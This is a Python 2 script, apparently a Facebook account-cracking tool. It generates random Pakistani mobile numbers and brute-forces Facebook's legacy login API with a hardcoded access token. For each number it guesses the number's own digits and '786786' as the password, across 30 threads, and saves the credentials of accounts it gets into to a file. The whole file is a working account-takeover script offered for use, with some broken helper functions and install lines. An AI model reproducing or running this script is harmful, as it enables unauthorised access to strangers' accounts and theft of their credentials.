
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print '\n\x1b[1;92m---------------------Jogi---------------------\n\n\x1b[1;94m Creater      : \x1b[1;92mJogi-Maharaja\n\x1b[1;94mFacebook: \x1b[1;92mJogiMaharaja\n\x1b[1;94mYoutube  : \x1b[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A\n\x1b[1;94mIts Not A Name Its Brand \x1b[1;92mJOGI\n\x1b[1;92mNo Login Need Enjoy without any problem\n\x1b[1;92mSpeed Commands Country code\n\n\x1b[1;92m-----------------Jogi-------------------------\n'
logo1 = '\n\[1;92m---------------------Jogi------------------------------------------\n\n\x1b[1;94mCreater      : \x1b[1;92mJogi-Maharaja\n\x1b[1;94mFacebook: \x1b[1;92mJogiMaharaja\n\x1b[1;94mYoutube  : \x1b[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A\n\x1b[1;94mIts Not A Name Its Brand \x1b[1;92mJOGI\n\x1b[1;92mNo Login Need Enjoy without any problem\n\x1b[1;92mSpeed Commands Country code\n\n\x1b[1;96m-----------------Jogi-------------------------\n'
logo2 = '\n\x1b[1;92m\n---------------------Jogi---------------------\n\n\x1b[1;94mCreater      : \x1b[1;92mJogi-Maharaja\n\x1b[1;94mFacebook: \x1b[1;92mJogiMaharaja\n\x1b[1;94mYoutube  : \x1b[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A\n\x1b[1;94mIts Not A Name Its Brand \x1b[1;92mJOGI\n\x1b[1;92mNo Login Need Enjoy without any problem\n\x1b[1;92mSpeed Commands Country code\n\n\x1b[1;96m-----------------Jogi-------------------------\n'
CorrectPasscode = 'jogi'
loop = 'true'
while loop == 'true':
    passcode = raw_input('\x1b[1;92m[?] \x1b[1;97mPASSWORD \x1b[1;97m: ')
    if passcode == CorrectPasscode:
        print '\n            \x1b[1;92mCORRECT\n                  '
        loop = 'false'
    else:
        print '\x1b[1;92mWRONG'
        os.system('xdg-open https://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A')

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[1]\x1b[1;92mStart cloning ( no login )'
    time.sleep(0.05)
    print '\x1b[1;93m[0]\x1b[1;92m Exit ( See You Later Bye )'
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;92mCHOOSE: \x1b[1;95m')
    if peak == '':
        print '\x1b[1;92mFill In Correctly'
        pilih_login()
    elif peak == '1':
        Zeek()


def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[1] Start Cracking'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \x1b[1;93m Back'
    time.sleep(0.05)
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;92mCHOOSE:\x1b[1;97m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo2
        print 'Enter any \033[1;93mpakistan\033[1;93m      code Number' + '\n'
        print 'first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.\033[1;93m  00 to 49 \033[1;93m'
        try:
            c = raw_input('\x1b[1;92mCHOOSE : ')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            jogiMaharaja()

    elif peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50 * '\x1b[1;92m-'
    xxx = str(len(id))
    jalan('\x1b[1;92m Total ids number: ' + xxx)
    jalan('\x1b[1;92mCode you choose: ' + c)
    jalan('\x1b[1;92mWait A While Start Cracking...')
    jalan('\x1b[1;92mTo Stop Process Press Ctrl+z')
    print 50 * '\x1b[1;91m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Hack\xe2\x9d\xa4\xef\xb8\x8f]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[CHECK] ' + k + c + user + '  |  ' + pass1
                cps = open('save/cloned.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '786786'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Hack\xe2\x9d\xa4\xef\xb8\x8f]  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/cloned.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[CHECK] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Hack\xe2\x9c\x93/CHECK\xe2\x9d\x97 : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    jalan('Note : Your CHECK\xe2\x9d\x97 account Will Open after 10 to 20 days')
    print ''
    print '\n    ______________________\n   \xe2\x95\x91\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x95\x91\n   \xe2\x95\x91\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x95\x91\n   \xe2\x95\x91\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x95\x91\n   \xe2\x95\x91\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x95\x91\n   \xe2\x95\x91\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x95\x91\n   \xe2\x95\x91\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x95\x91 \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n  \xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x9a\xe2\x95\x97\n  \xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x96\x88\xe2\x95\x91\n  \xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\xac\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x96\x88\xe2\x95\x91\n  \xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x95\x9a\xe2\x95\x9d\xe2\x96\x88\xe2\x95\x91\n  \xe2\x95\x9a\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x90\xe2\x95\x9d\n     \xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\xa0\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\x9d\n        \xe2\x95\x91\xe2\x95\x91\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x88\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92.\xef\xbd\xa1oO\n        \xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa0\xe2\x95\xa6\xe2\x95\xa6\xe2\x95\xa6\xe2\x95\x97\n        \xe2\x95\x9a\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n           \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\n\x1b[1;96mThanks See You Later\n\x1b[1;96m My Contact\n\x1b[1;95mFb\x1b[1;92mJogiMaharaja\n\x1b[1;95myoutube\x1b[1;97mhttps://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    login()